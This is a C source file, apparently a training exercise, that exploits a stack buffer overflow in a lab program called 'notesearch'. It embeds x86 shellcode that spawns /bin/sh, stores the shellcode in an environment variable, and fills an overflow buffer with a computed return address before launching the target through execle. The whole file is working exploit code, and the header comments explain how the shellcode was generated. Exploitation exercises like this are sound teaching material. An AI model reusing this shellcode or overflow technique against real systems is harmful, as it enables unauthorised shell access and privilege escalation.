/**
* @file exploit_notesearch_env.c
* @author Philip Wiese
* @date 30 Sep 2016
* @brief Exploitcode f√ºr Notesearch Programm mit Environement 
*			Shellcode Buffer
*
* Shellcode generiert aus <exec_shell.s> mit 
* #> nasm exec_shell.s
* #> hexdump -v -e '"\\x" 1/1 "%02x" ""' exec_shell; hexdump exec_shell
*
* Problem: When trying <ret_offet>=1  as it should be the 
* saved return address moves 1 byte so its no longer at the rigth place
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "toolbox.h"

#define LENGTH 200

char shellcode[] =
"\xeb\x16\x5b\x31\xc0\x88\x43\x07"
"\x89\x5b\x08\x89\x43\x0c\x8d\x4b"
"\x08\x8d\x53\x0c\xb0\x0b\xcd\x80"
"\xe8\xe5\xff\xff\xff\x2f\x62\x69"
"\x6e\x2f\x73\x68";


int main(int argc, char *argv[]) {
	char *env[2] = { shellcode, 0 };
	unsigned int i, ret, ret_offset=0;
	
	char *buffer = (char *) ec_malloc(LENGTH);
	bzero(buffer, LENGTH);
	
	if (argc>1) //Set offset
		ret_offset = atoi(argv[1]);
		
		
	
	ret = 0xbffffffa - (sizeof(shellcode)-ret_offset) - strlen("./notesearch");
	printf("[DEBUG] Return Address at %p\n", ret);
	for (i=0; i<LENGTH; i+=4)
		*((unsigned int *)(buffer+i)) = ret;
	
	execle("./notesearch", "notesearch", buffer, 0, env);
	free(buffer);
}
